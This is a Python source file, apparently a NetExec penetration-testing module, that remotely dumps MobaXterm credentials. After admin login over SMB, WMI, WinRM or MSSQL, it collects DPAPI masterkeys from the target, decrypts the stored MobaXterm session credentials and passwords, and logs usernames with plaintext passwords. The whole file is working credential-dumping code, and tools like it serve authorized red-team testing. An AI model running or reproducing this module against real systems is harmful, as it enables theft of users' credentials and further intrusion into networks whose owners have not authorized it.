from dploot.triage.mobaxterm import MobaXtermTriage, MobaXtermCredential, MobaXtermPassword

from nxc.helpers.misc import CATEGORY


class NXCModule:
    name = "mobaxterm"
    description = "Remotely dump MobaXterm credentials via RemoteRegistry or NTUSER.dat export"
    supported_protocols = ["smb", "wmi", "winrm", "mssql"]
    category = CATEGORY.CREDENTIAL_DUMPING

    def options(self, context, module_options):
        """No options available"""

    def on_admin_login(self, context, connection):
        self.masterkeys = connection.dpapi_triage.collect_masterkeys_from_target(dump_users=True, dump_system=False)

        if len(self.masterkeys) == 0:
            context.log.fail("No masterkeys looted")
            return

        context.log.success("Looting MobaXterm secrets")

        def mobaxterm_callback(credential):
            if isinstance(credential, MobaXtermCredential):
                log_text = "{} - {}:{}".format(credential.name, credential.username, credential.password.decode("latin-1"))
            elif isinstance(credential, MobaXtermPassword):
                log_text = "{}:{}".format(credential.username, credential.password.decode("latin-1"))
            context.log.highlight(f"[{credential.winuser}] {log_text}")

        try:
            triage = MobaXtermTriage(target=connection.dpapi_triage.target, conn=connection.dpapi_triage.conn, masterkeys=self.masterkeys)
            triage.triage_mobaxterm()
        except Exception as e:
            context.log.debug(f"Could not loot MobaXterm secrets: {e}")
